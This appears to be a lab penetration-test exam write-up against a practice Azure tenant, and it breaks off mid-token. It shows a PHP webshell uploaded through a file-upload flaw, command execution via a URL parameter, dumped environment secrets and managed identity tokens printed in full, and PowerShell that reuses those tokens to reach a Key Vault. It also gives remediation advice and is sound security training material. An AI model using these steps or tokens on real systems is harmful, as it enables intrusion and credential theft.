# Exam

- [Exam](#exam)
  - [Pentest Summary](#pentest-summary)
  - [Security Enhancement Suggestions](#security-enhancement-suggestions)
    - [Secure Public Facing Web Applciation](#secure-public-facing-web-applciation)
    - [Follow least-privilege principle](#follow-least-privilege-principle)
    - [Avoid storing cleartext credential](#avoid-storing-cleartext-credential)
    - [Fine-grained IAM management](#fine-grained-iam-management)
  - [Preparations](#preparations)
  - [Initial Access - Inventory Web Application - Abuse Unrestricted File Upload](#initial-access---inventory-web-application---abuse-unrestricted-file-upload)
  - [Credential Access - Abuse Inventory App vulnerability to obtain Managed Identity tokens](#credential-access---abuse-inventory-app-vulnerability-to-obtain-managed-identity-tokens)
  - [Lateral Movement - Access credential in Key Vault](#lateral-movement---access-credential-in-key-vault)
  - [Privilege Escalation - Access Automation Account and Stored Credentials](#privilege-escalation---access-automation-account-and-stored-credentials)
  - [Privilege Escalation - Get cleartext secret in blob epbackup-space as User3769563720055157779](#privilege-escalation---get-cleartext-secret-in-blob-epbackup-space-as-user3769563720055157779)
  - [Privilege Escalation - Get cleartext secret in blob epbackup-space as Helper App's Managed Identity](#privilege-escalation---get-cleartext-secret-in-blob-epbackup-space-as-helper-apps-managed-identity)
  - [Actions on Objectives - Access final flag in the Key Vault as the Managed Identity of UserApp](#actions-on-objectives---access-final-flag-in-the-key-vault-as-the-managed-identity-of-userapp)
  - [Tools](#tools)
  - [References](#references)
    - [simple-webshell.phtml](#simple-webshellphtml)
    - [get-token.phtml](#get-tokenphtml)
    - [get-keyvault-token.phtml](#get-keyvault-tokenphtml)

---

## Pentest Summary

The following table shows the accessed resources in the pentest.

<br/>

| **Tenant ID** | **Az Resource** | **Name** | **Method to exploit** |
| --- | --- | --- | --- |
| 15e43385-64db-4b74-a18b-d167ec5ef191 | Inventory Webapp | Exploited the unrestricted upload function |
| 15e43385-64db-4b74-a18b-d167ec5ef191 | Managed Identity | Inventory webapp service prinicipal | Exploit the upload function and use PHP `system` command to get the managed identity access and ARM tokens |
| 15e43385-64db-4b74-a18b-d167ec5ef191 | Key Vault | inventorycreds-19782062 | Access using the Inventory webapp Managed Identity  |
| 15e43385-64db-4b74-a18b-d167ec5ef191 | Azure AD User | User6673757339746967328@defcorpspace.onmicrosoft.com | Use the Inventory webapp's managed identity to access the Key Vault and get the credential of this user |
| 15e43385-64db-4b74-a18b-d167ec5ef191 | Automation Account | backupautomation-1978206228366054214 | User6673757339746967328@defcorpspace.onmicrosoft.com is able to edit the runbook in the Automation Account backupautomation-1978206228366054214. |
| 15e43385-64db-4b74-a18b-d167ec5ef191 | Azure AD User | User3769563720055157779@defcorpspace.onmicrosoft.com | Use the automation runbook to get the saved credential "credential" in the Automation Account |
| 15e43385-64db-4b74-a18b-d167ec5ef191 | Azure Storage Account | epbackup1978206228 | Use the credential of User3769563720055157779@defcorpspace.onmicrosoft.com to access |
| 15e43385-64db-4b74-a18b-d167ec5ef191 | Azure Blob | epbackup-space | Use the credential of User3769563720055157779@defcorpspace.onmicrosoft.com to access via Azure Storage Explorer |
| 15e43385-64db-4b74-a18b-d167ec5ef191 | Managed Identity | 16b6a33e-0d2b-456d-96fb-cbfce4c6000c | Obtained the managed identity secret in manifest.txt found in the blob container epbackup-space |
| 15e43385-64db-4b74-a18b-d167ec5ef191 | Azure Blob | epbackup-planetary | Use the managed identity credential 16b6a33e-0d2b-456d-96fb-cbfce4c6000c |
| 4e7a1151-36d0-457e-b489-729cf0fb315a | Managed Identity | f2381716-b286-4605-a2f7-1234f8019631 | Obtained the managed identity secret in manifest.txt found in the blob container epbackup-planetary |
| 4e7a1151-36d0-457e-b489-729cf0fb315a | Key Vault | planetary-43556228109789 | Use the managed identity f2381716-b286-4605-a2f7-1234f8019631 to access the Key Vault and get the final flag in the value of the vault object finalflag-fprime |


<br/>

---

## Security Enhancement Suggestions

### Secure Public Facing Web Applciation

The initial access is due to insecure webapp. To mitigate:

1. Perform code review to find vulnerabilities (e.g. Unexpected inputs)
2. Deploy WAF to block web attacks

Reference:
- https://docs.microsoft.com/en-us/azure/web-application-firewall/ag/ag-overview

<br/>

### Follow least-privilege principle

The privilege escalations done in the assessment are possible due to the high privilege permissions assigned to the managed identity. For example, the inventory system might not need the access to the Key Vault.

It is suggested to review the managed identity and the related permissions to make sure they follow the Least Privilege Principle.

Reference:
- https://docs.microsoft.com/en-us/azure/role-based-access-control/best-practices

<br/>

### Avoid storing cleartext credential

During the assessment, cleartext credentials are found in Azure Blob storage, allowing the access to another Azure tenant.

Avoid storing storing cleartext credential.  

Specifically for Azure, consider enabling Azure Defender for Storage, which enables the detection of exposing credentials in clear text.

Reference:
- https://docs.microsoft.com/en-us/defender-for-identity/cas-isp-clear-text

<br/>

### Fine-grained IAM management

Consider tighten the IAM by adding in conditional access, session control, etc

Reference:
- https://docs.microsoft.com/en-us/azure/security/fundamentals/identity-management-best-practices

<br/>

---

## Preparations

First disable real-time monitoring and IE protection on the Student VM:

![picture 1](images/de720b632ede29fb4fcbe64ed2e3c95804b6368f35d1b069eb03cc4abea60c82.png)  

![picture 2](images/c7f011b368a9b1b3b3c180e01d95975175064f97a6b05971c69b8c9b75e66957.png)  

<br/>

Running as Administrator, install Azure PowerShell module:

```
Install-Module Az
```

![picture 15](images/00b723f41bbfefd7dd5e8c307efeb0372921a352a13e420e0c51473f7c4dcbf2.png)  


<br/>

Install Python 3.9:

- https://www.python.org/downloads/

<br/>

Install Azure AD module:

```
Install-Module AzureAD
```

![picture 24](images/19dff744c01cbff186601515d9be265b37c9b97297b6162bbfb1efc84b75d495.png)  

<br/>

Install Azure Storage Explorer:

- https://azure.microsoft.com/en-us/features/storage-explorer/

<br/>

---

## Initial Access - Inventory Web Application - Abuse Unrestricted File Upload

<br/>

| **Tactic** | **Technique** | **Tool** | **Description** |
| --- | --- | --- | --- |
| Initial Access | T1190 - Exploit Public-Facing Application | PHP Webshell | Use `simple-webshell.phtml` to perform Remote Code Execution. |

<br/>

Target web application for initial access:
- https://InventoryMangement-1978206228.azurewebsites.net

<br/>

Browsing the web application, it is an inventory system:

![picture 3](images/2d9b81eb8fa0c268763395a6550e4d1b96d1e75d557136fce1e99ca10d4b6bb4.png)  

<br/>

The `Add Products` function allows us to upload image:
- https://inventorymangement-1978206228.azurewebsites.net/IMS/add.html

![picture 4](images/cef27f8796bd19ed1168adc3abc2f8177b6e77f35696d71caa558bdca70d533a.png)  

<br/>

Try to upload a txt file:

![picture 5](images/2dc307597c97f27d5460c1968d639bf9f6074ba2e361d79a4c84e0ba5438ca29.png)  

![picture 6](images/5cdd7111160b7fa7548dc551ea7eb09058c36589687184df5a5b06d78cb4d654.png)  

- It shows `Invalid file` - the upload is not successful

<br/>

Try to change the poc file extension to `.phtml`:

![picture 7](images/20f7d641a052ecd48c269b2943b9c8cc4fcc700638646dfc81689f0eb69b36b3.png)  

![picture 8](images/ecc90c1cecbb349f3ae792115a97f35dafe45eb81296b6d6cff9560025a72c17.png)  

- Upload successfully

<br/>

Trying to guess the upload folder - assume it is in the uri `/IMS/uploads/`, browse:
- https://inventorymangement-1978206228.azurewebsites.net/IMS/uploads/poc.phtml

![picture 9](images/b0ce8c14e8489e7be45cfabfbc0eb45b0be7313c13f4ee89bbad6dd13174b63a.png)  

- As shown, the POC file `poc.phtml` resides in https://inventorymangement-1978206228.azurewebsites.net/IMS/uploads/.

Leveraging this, it is possible to abuse this upload function to get **Remote Code Execution**.

<br/>

Try to upload a webshell `simple-webshell.phtml` (the source code is in the **References** section):

![picture 10](images/7eaa7d57b1645599de0e9907cbbfe554b026e3d0de1538812a16d5b0a80e2819.png)  

Browse https://inventorymangement-1978206228.azurewebsites.net/IMS/uploads/simple-webshell.phtml?cmd=whoami:

![picture 11](images/c2b612e2bc22d1416db17fd9064ab4e80eca51117404516e053fb7da5b8b1146.png)  

- As shown, we can get `whoami` to be executed.

<br/>

---

## Credential Access - Abuse Inventory App vulnerability to obtain Managed Identity tokens

<br/>

| **Tactic** | **Technique** | **Tool** | **Description** |
| --- | --- | --- | --- |
| Credential Access | T1528 - Steal Application Access Token | `get-token.phtml`   | Use `get-token.phtml` to get the application access token |

<br/>

Try to get the instance environment variables:

- https://inventorymangement-1978206228.azurewebsites.net/IMS/uploads/simple-webshell.phtml?cmd=env

![picture 14](images/bd351c5eaf96c5149bf8b70d10b5b97adaf88b7f977abf77e07d012a1d0db7aa.png)  

```
PHP_EXTRA_CONFIGURE_ARGS=--with-apxs2 --disable-cgi APACHE_CONFDIR=/etc/apache2 PLATFORM_VERSION=93.0.7.60 HOSTNAME=15c0cce1f604 PHP_INI_DIR=/usr/local/etc/php WEBSITE_INSTANCE_ID=cfb98572471b0c41299b8ff4c92bbd3ef0be3e4e54d0a694aa6258a51d038669 IDENTITY_HEADER=2b9c3701-dc26-4131-b9b9-4e28126c5a67 APACHE_DOCUMENT_ROOT=/home/site/wwwroot SHLVL=0 OLDPWD=/home/site/wwwroot APACHE_SERVER_LIMIT=1000 PHP_EXTRA_BUILD_DEPS=apache2-dev PORT=8080 WEBSITE_RESOURCE_GROUP=3144ce792dfd350a968e15f9e43ec199cd94b42be1c33571d5750cc6243bc5de APACHE_PORT=8080 ORYX_ENV_TYPE=AppService DIAGNOSTIC_LOGS_MOUNT_PATH=/var/log/diagnosticLogs ScmType=ExternalGit REMOTEDEBUGGINGVERSION=16.0.30709.132 PHP_LDFLAGS=-Wl,-O1 -Wl,--hash-style=both -pie APACHE_RUN_DIR=/var/run/apache2 PHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64 PHP_MD5= WEBSITE_HOSTNAME=inventorymangement-1978206228.azurewebsites.net PHP_VERSION=7.3 APACHE_PID_FILE=/var/run/apache2/apache2.pid WEBSITE_STACK=PHP ORYX_ENV_NAME=inventorymangement-1978206228 GPG_KEYS=CBAF69F173A0FEA4B537F470D66C9593118BCCB6 F38252826ACD957EF380D39F2F7956BC5DA04B5D WEBSITE_ROLE_INSTANCE_ID=0 PHP_ASC_URL=https://www.php.net/get/php-7.3.26.tar.xz.asc/from/this/mirror PHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64 APPSETTING_REMOTEDEBUGGINGVERSION=16.0.30709.132 WEBSITE_AUTH_ENCRYPTION_KEY=98FB5E92F43326425568341C9D96A9EF44B59B7A57FACE10612FA18638B16121 PHP_URL=https://www.php.net/get/php-7.3.26.tar.xz/from/this/mirror WEBSITE_SITE_NAME=InventoryMangement-1978206228 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/home/site/wwwroot APACHE_LOCK_DIR=/var/lock/apache2 APPSETTING_WEBSITE_SITE_NAME=InventoryMangement-1978206228 MSI_ENDPOINT=http://172.16.0.2:8081/msi/token LANG=C WEBSITE_AUTH_ENABLED=False MSI_SECRET=2b9c3701-dc26-4131-b9b9-4e28126c5a67 APPSETTING_WEBSITE_AUTH_ENABLED=False APACHE_RUN_GROUP=www-data WEBSITE_OWNER_NAME=2b45e216-b3fd-4902-bf85-406b8bf5d46e+3144ce792dfd350a968e15f9e43ec199cd94b42be1c33571d5750cc6243bc5de-SoutheastAsiawebspace-Linux APACHE_RUN_USER=e360e841a7a426880532fc5d APACHE_LOG_DIR=/var/log/apache2 APACHE_MAX_REQ_WORKERS=256 PHPIZE_DEPS=autoconf dpkg-dev file g++ gcc libc-dev make pkg-config re2c IDENTITY_ENDPOINT=http://172.16.0.2:8081/msi/token PWD=/home/site/wwwroot/IMS/uploads COMPUTERNAME=lw1mdlwk00004B APPSVC_RUN_ZIP=FALSE PHP_SHA256=d93052f4cb2882090b6a37fd1e0c764be1605a2461152b7f6b8f04fa48875208 APACHE_ENVVARS=/etc/apache2/envvars SSH_PORT=2222 APPSETTING_ScmType=ExternalGit ORYX_AI_INSTRUMENTATION_KEY=4aadba6b-30c8-42db-9b93-024d5c62b887 WEBSITE_AUTH_SIGNING_KEY=1FD58C190544B4F972F3D4272291173134AEB8DFBBAAFD5144618231C66514A2 WEBSITE_SKU=Basic 
```

- `IDENTITY_ENDPOINT`: `http://172.16.0.2:8081/msi/token`
- `IDENTITY_HEADER`: `2b9c3701-dc26-4131-b9b9-4e28126c5a67`
- These show that the web application is using **Managed Identity**.

<br/>

Since this is an Azure hosted application, it is possible to get the token attached to the webapp. Upload another file `get-token.phtml` (source code is documented in the **References** section):

![picture 12](images/acf9e6b683791b2732d0991f1d46ae62f18a7ff5fec2e955f8947cdef264fa85.png)  

<br/>

Browse https://inventorymangement-1978206228.azurewebsites.net/IMS/uploads/get-token.phtml:

![picture 13](images/7b5429829b71767acbd0642a633c85399bf07a2486da6b6cd071586671e2b5ee.png)  

- The raw response:

```
{
    "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyIsImtpZCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzE1ZTQzMzg1LTY0ZGItNGI3NC1hMThiLWQxNjdlYzVlZjE5MS8iLCJpYXQiOjE2MjExMzYyMjMsIm5iZiI6MTYyMTEzNjIyMywiZXhwIjoxNjIxMjIyOTIzLCJhaW8iOiJFMlpnWU5paW5pTDhUM24yNGlZR01kYmkrVHNTQVE9PSIsImFwcGlkIjoiYTBiZmY0NTQtNjYzYS00ZGZjLWE3NjEtNWQ1MzE4OGFiYjAyIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMTVlNDMzODUtNjRkYi00Yjc0LWExOGItZDE2N2VjNWVmMTkxLyIsIm9pZCI6IjY4MDQxMGI0LTc5ZDMtNGMxNi04MzY5LTA2NjQ4YTdjOWQzMCIsInJoIjoiMC5BWEVBaFRQa0ZkdGtkRXVoaTlGbjdGN3hrVlQwdjZBNlp2eE5wMkZkVXhpS3V3SnhBQUEuIiwic3ViIjoiNjgwNDEwYjQtNzlkMy00YzE2LTgzNjktMDY2NDhhN2M5ZDMwIiwidGlkIjoiMTVlNDMzODUtNjRkYi00Yjc0LWExOGItZDE2N2VjNWVmMTkxIiwidXRpIjoia2xoeURkQjJKMEs2RTA5OXF5QXJBQSIsInZlciI6IjEuMCIsInhtc19taXJpZCI6Ii9zdWJzY3JpcHRpb25zLzJiNDVlMjE2LWIzZmQtNDkwMi1iZjg1LTQwNmI4YmY1ZDQ2ZS9yZXNvdXJjZWdyb3Vwcy8zMTQ0Y2U3OTJkZmQzNTBhOTY4ZTE1ZjllNDNlYzE5OWNkOTRiNDJiZTFjMzM1NzFkNTc1MGNjNjI0M2JjNWRlL3Byb3ZpZGVycy9NaWNyb3NvZnQuV2ViL3NpdGVzL0ludmVudG9yeU1hbmdlbWVudC0xOTc4MjA2MjI4IiwieG1zX3RjZHQiOiIxNjE5Nzc4NjAyIn0.QChCF6IQHoFLnDvMswN-0y1CwcDQ0OqPIvG7QYerMOYUjid6-VoUSrYUKQdbVNUK9JKnn--pTAa-YENHrFp_PeT04rQfU2o5af31kgWBJ8mwHp2IQKbH9kf7wCEasTeBTQVysRrK1trvtOI7UOFbxkOU3fVPqXSBI0w3VJo2oz6gprdzYFyMiCrW17P_vGzJbL1Lz7dzWLGHTyUehc1PIKFAUfuVx8RMpdPTKpVFSJsXlcxqqWfhjETAtwhjXzOfhQ4J09rk09gNOTgf12Y-EMGREbi7y5x3tS8R9iQU50LScfoYLsSj0q0R4TvBYpc5Ua0nys-1N3UZ8yb5xiu0Mw",
    "expires_on": "05/17/2021 03:42:02 +00:00",
    "resource": "https://management.azure.com/",
    "token_type": "Bearer",
    "client_id": "a0bff454-663a-4dfc-a761-5d53188abb02"
}
```

- As shown, we get the managed identity `access_token` by abusing the image upload function in `Add Product` page.

<br/>

Then we can use the managed identity to check the resource available using **Az Powershell**:

```
$token = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyIsImtpZCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzE1ZTQzMzg1LTY0ZGItNGI3NC1hMThiLWQxNjdlYzVlZjE5MS8iLCJpYXQiOjE2MjExMzYyMjMsIm5iZiI6MTYyMTEzNjIyMywiZXhwIjoxNjIxMjIyOTIzLCJhaW8iOiJFMlpnWU5paW5pTDhUM24yNGlZR01kYmkrVHNTQVE9PSIsImFwcGlkIjoiYTBiZmY0NTQtNjYzYS00ZGZjLWE3NjEtNWQ1MzE4OGFiYjAyIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMTVlNDMzODUtNjRkYi00Yjc0LWExOGItZDE2N2VjNWVmMTkxLyIsIm9pZCI6IjY4MDQxMGI0LTc5ZDMtNGMxNi04MzY5LTA2NjQ4YTdjOWQzMCIsInJoIjoiMC5BWEVBaFRQa0ZkdGtkRXVoaTlGbjdGN3hrVlQwdjZBNlp2eE5wMkZkVXhpS3V3SnhBQUEuIiwic3ViIjoiNjgwNDEwYjQtNzlkMy00YzE2LTgzNjktMDY2NDhhN2M5ZDMwIiwidGlkIjoiMTVlNDMzODUtNjRkYi00Yjc0LWExOGItZDE2N2VjNWVmMTkxIiwidXRpIjoia2xoeURkQjJKMEs2RTA5OXF5QXJBQSIsInZlciI6IjEuMCIsInhtc19taXJpZCI6Ii9zdWJzY3JpcHRpb25zLzJiNDVlMjE2LWIzZmQtNDkwMi1iZjg1LTQwNmI4YmY1ZDQ2ZS9yZXNvdXJjZWdyb3Vwcy8zMTQ0Y2U3OTJkZmQzNTBhOTY4ZTE1ZjllNDNlYzE5OWNkOTRiNDJiZTFjMzM1NzFkNTc1MGNjNjI0M2JjNWRlL3Byb3ZpZGVycy9NaWNyb3NvZnQuV2ViL3NpdGVzL0ludmVudG9yeU1hbmdlbWVudC0xOTc4MjA2MjI4IiwieG1zX3RjZHQiOiIxNjE5Nzc4NjAyIn0.QChCF6IQHoFLnDvMswN-0y1CwcDQ0OqPIvG7QYerMOYUjid6-VoUSrYUKQdbVNUK9JKnn--pTAa-YENHrFp_PeT04rQfU2o5af31kgWBJ8mwHp2IQKbH9kf7wCEasTeBTQVysRrK1trvtOI7UOFbxkOU3fVPqXSBI0w3VJo2oz6gprdzYFyMiCrW17P_vGzJbL1Lz7dzWLGHTyUehc1PIKFAUfuVx8RMpdPTKpVFSJsXlcxqqWfhjETAtwhjXzOfhQ4J09rk09gNOTgf12Y-EMGREbi7y5x3tS8R9iQU50LScfoYLsSj0q0R4TvBYpc5Ua0nys-1N3UZ8yb5xiu0Mw'; $clientid = 'a0bff454-663a-4dfc-a761-5d53188abb02'; Connect-AzAccount -AccessToken $token -AccountId $clientid; Get-AzResource | fl Name, ResourceGroupName, ResourceType, ResourceId
```

![picture 16](images/dc9fe0cec40c2fec27a09f9b2df3162fe359b5d8c45d35944bf6274b60680ca5.png)  

- As shown, we have access to the **Key Vault** `inventorycreds-19782062`

```
Name              : inventorycreds-19782062
ResourceGroupName : 3144ce792dfd350a968e15f9e43ec199cd94b42be1c33571d5750cc6243bc5de
ResourceType      : Microsoft.KeyVault/vaults
ResourceId        : /subscriptions/2b45e216-b3fd-4902-bf85-406b8bf5d46e/resourceGroups/3144ce792dfd350a968e15f9e43ec199cd94b42be1c33571d5750cc6243bc5de/providers/Microsoft.KeyVault/vaults/inventorycreds-19782062
```

<br/>

---

## Lateral Movement - Access credential in Key Vault

<br/>

| **Tactic** | **Technique** | **Tool** | **Description** |
| --- | --- | --- | --- |
| Forge Web Credentials | T1606 - Forge Web Credentials | Az PowerShell | Use the tokens of the managed identity to login Azure and access the Azure key vault |
| Privilege Escalation | T1078.004 - Valid Accounts: Cloud Accounts | Az PowerShell  | Use the managed identity to obtain a valid account in key vault |


<br/>


Check the permission to access the Key Vault:

```
$URI = 'https://management.azure.com/subscriptions/2b45e216-b3fd-4902-bf85-406b8bf5d46e/resourceGroups/3144ce792dfd350a968e15f9e43ec199cd94b42be1c33571d5750cc6243bc5de/providers/Microsoft.KeyVault/vaults/inventorycreds-19782062/providers/Microsoft.Authorization/permissions?api-version=2015-07-01'

$RequestParams = @{ 
    Method = 'GET' 
    Uri = $URI
    Headers = @{ 
        'Authorization' = "Bearer $token"
    }
} 

(Invoke-RestMethod @RequestParams).value
```

![picture 18](images/92805f421ded55766da4f0df60732a8d3e1a27fb8161c1cf4e7f8751ba3f5040.png)  

- The managed identity has the read permission on the KeyVault

<br/>

Upload `get-keyvault-token.phtml` (see **Resources** section for the source code) to the webapp and get the ARM token:

![picture 19](images/807532808201f4a90898127fc1f75cd3ab6fec9f99f1857411204a0d1b8829ab.png)  

Access https://inventorymangement-1978206228.azurewebsites.net/IMS/uploads/get-keyvault-token.phtml:

![picture 20](images/a1c919b63a706e37b62b8a7126a7389cf090b293c253224e9698bcb672f9ba90.png)  

- Raw response:

```
{
    "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyIsImtpZCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyJ9.eyJhdWQiOiJodHRwczovL3ZhdWx0LmF6dXJlLm5ldCIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzE1ZTQzMzg1LTY0ZGItNGI3NC1hMThiLWQxNjdlYzVlZjE5MS8iLCJpYXQiOjE2MjExNDA0MjYsIm5iZiI6MTYyMTE0MDQyNiwiZXhwIjoxNjIxMjI3MTI2LCJhaW8iOiJFMlpnWURnNHRhajJzVjNBOG5Eck0wTFdSYlVOQUE9PSIsImFwcGlkIjoiYTBiZmY0NTQtNjYzYS00ZGZjLWE3NjEtNWQ1MzE4OGFiYjAyIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMTVlNDMzODUtNjRkYi00Yjc0LWExOGItZDE2N2VjNWVmMTkxLyIsIm9pZCI6IjY4MDQxMGI0LTc5ZDMtNGMxNi04MzY5LTA2NjQ4YTdjOWQzMCIsInJoIjoiMC5BWEVBaFRQa0ZkdGtkRXVoaTlGbjdGN3hrVlQwdjZBNlp2eE5wMkZkVXhpS3V3SnhBQUEuIiwic3ViIjoiNjgwNDEwYjQtNzlkMy00YzE2LTgzNjktMDY2NDhhN2M5ZDMwIiwidGlkIjoiMTVlNDMzODUtNjRkYi00Yjc0LWExOGItZDE2N2VjNWVmMTkxIiwidXRpIjoiMDlSNlNDUm1pVWlTQllUREw0b2RBQSIsInZlciI6IjEuMCIsInhtc19taXJpZCI6Ii9zdWJzY3JpcHRpb25zLzJiNDVlMjE2LWIzZmQtNDkwMi1iZjg1LTQwNmI4YmY1ZDQ2ZS9yZXNvdXJjZWdyb3Vwcy8zMTQ0Y2U3OTJkZmQzNTBhOTY4ZTE1ZjllNDNlYzE5OWNkOTRiNDJiZTFjMzM1NzFkNTc1MGNjNjI0M2JjNWRlL3Byb3ZpZGVycy9NaWNyb3NvZnQuV2ViL3NpdGVzL0ludmVudG9yeU1hbmdlbWVudC0xOTc4MjA2MjI4In0.Zm5uFdmdSe7B4zDdZJGWL1LXy4Zf8ZZ01JqLth2oFmKxj0I-S_zY99lbyneb_OQZrqvd8xWQLUj4Yx2nXELwd73PuhHrkDwme3sW7dPn3YlcSjoU4Dj1TbhhRV31AmR0Txje5OwF_ai88jmELc5ClugECGSol1lJl4_qzTFsUdNZ5L6sl71j1TSf4hnvxx8ZRGV0dDereirWcUoNc14CzpPsh6_aFexrs83Dct6OmkG3bAISDF_ZMKT5hCb_6Nz1ZrFU8pzcrdkHg01uGYAL6fQZMXHOWP55VzQ48500TfYUYJ1yZthD1F4kwqiM0P13gGuX_kvyPKRD5llehCqkbg",
    "expires_on": "05/17/2021 04:52:05 +00:00",
    "resource": "https://vault.azure.net",
    "token_type": "Bearer",
    "client_id": "a0bff454-663a-4dfc-a761-5d53188abb02"
}
```

<br/>

Use the access token and ARM token to login to Azure using Az PowerShell:

```
$token = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyIsImtpZCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzE1ZTQzMzg1LTY0ZGItNGI3NC1hMThiLWQxNjdlYzVlZjE5MS8iLCJpYXQiOjE2MjExMzYyMjMsIm5iZiI6MTYyMTEzNjIyMywiZXhwIjoxNjIxMjIyOTIzLCJhaW8iOiJFMlpnWU5paW5pTDhUM24yNGlZR01kYmkrVHNTQVE9PSIsImFwcGlkIjoiYTBiZmY0NTQtNjYzYS00ZGZjLWE3NjEtNWQ1MzE4OGFiYjAyIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMTVlNDMzODUtNjRkYi00Yjc0LWExOGItZDE2N2VjNWVmMTkxLyIsIm9pZCI6IjY4MDQxMGI0LTc5ZDMtNGMxNi04MzY5LTA2NjQ4YTdjOWQzMCIsInJoIjoiMC5BWEVBaFRQa0ZkdGtkRXVoaTlGbjdGN3hrVlQwdjZBNlp2eE5wMkZkVXhpS3V3SnhBQUEuIiwic3ViIjoiNjgwNDEwYjQtNzlkMy00YzE2LTgzNjktMDY2NDhhN2M5ZDMwIiwidGlkIjoiMTVlNDMzODUtNjRkYi00Yjc0LWExOGItZDE2N2VjNWVmMTkxIiwidXRpIjoia2xoeURkQjJKMEs2RTA5OXF5QXJBQSIsInZlciI6IjEuMCIsInhtc19taXJpZCI6Ii9zdWJzY3JpcHRpb25zLzJiNDVlMjE2LWIzZmQtNDkwMi1iZjg1LTQwNmI4YmY1ZDQ2ZS9yZXNvdXJjZWdyb3Vwcy8zMTQ0Y2U3OTJkZmQzNTBhOTY4ZTE1ZjllNDNlYzE5OWNkOTRiNDJiZTFjMzM1NzFkNTc1MGNjNjI0M2JjNWRlL3Byb3ZpZGVycy9NaWNyb3NvZnQuV2ViL3NpdGVzL0ludmVudG9yeU1hbmdlbWVudC0xOTc4MjA2MjI4IiwieG1zX3RjZHQiOiIxNjE5Nzc4NjAyIn0.QChCF6IQHoFLnDvMswN-0y1CwcDQ0OqPIvG7QYerMOYUjid6-VoUSrYUKQdbVNUK9JKnn--pTAa-YENHrFp_PeT04rQfU2o5af31kgWBJ8mwHp2IQKbH9kf7wCEasTeBTQVysRrK1trvtOI7UOFbxkOU3fVPqXSBI0w3VJo2oz6gprdzYFyMiCrW17P_vGzJbL1Lz7dzWLGHTyUehc1PIKFAUfuVx8RMpdPTKpVFSJsXlcxqqWfhjETAtwhjXzOfhQ4J09rk09gNOTgf12Y-EMGREbi7y5x3tS8R9iQU50LScfoYLsSj0q0R4TvBYpc5Ua0nys-1N3UZ8yb5xiu0Mw'; $keyvaulttoken = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyIsImtpZCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyJ9.eyJhdWQiOiJodHRwczovL3ZhdWx0LmF6dXJlLm5ldCIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzE1ZTQzMzg1LTY0ZGItNGI3NC1hMThiLWQxNjdlYzVlZjE5MS8iLCJpYXQiOjE2MjExNDA0MjYsIm5iZiI6MTYyMTE0MDQyNiwiZXhwIjoxNjIxMjI3MTI2LCJhaW8iOiJFMlpnWURnNHRhajJzVjNBOG5Eck0wTFdSYlVOQUE9PSIsImFwcGlkIjoiYTBiZmY0NTQtNjYzYS00ZGZjLWE3NjEtNWQ1MzE4OGFiYjAyIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMTVlNDMzODUtNjRkYi00Yjc0LWExOGItZDE2N2VjNWVmMTkxLyIsIm9pZCI6IjY4MDQxMGI0LTc5ZDMtNGMxNi04MzY5LTA2NjQ4YTdjOWQzMCIsInJoIjoiMC5BWEVBaFRQa0ZkdGtkRXVoaTlGbjdGN3hrVlQwdjZBNlp2eE5wMkZkVXhpS3V3SnhBQUEuIiwic3ViIjoiNjgwNDEwYjQtNzlkMy00YzE2LTgzNjktMDY2NDhhN2M5ZDMwIiwidGlkIjoiMTVlNDMzODUtNjRkYi00Yjc0LWExOGItZDE2N2VjNWVmMTkxIiwidXRpIjoiMDlSNlNDUm1pVWlTQllUREw0b2RBQSIsInZlciI6IjEuMCIsInhtc19taXJpZCI6Ii9zdWJzY3JpcHRpb25zLzJiNDVlMjE2LWIzZmQtNDkwMi1iZjg1LTQwNmI4YmY1ZDQ2ZS9yZXNvdXJjZWdyb3Vwcy8zMTQ0Y2U3OTJkZmQzNTBhOTY4ZTE1ZjllNDNlYzE5OWNkOTRiNDJiZTFjMzM1NzFkNTc1MGNjNjI0M2JjNWRlL3Byb3ZpZGVycy9NaWNyb3NvZnQuV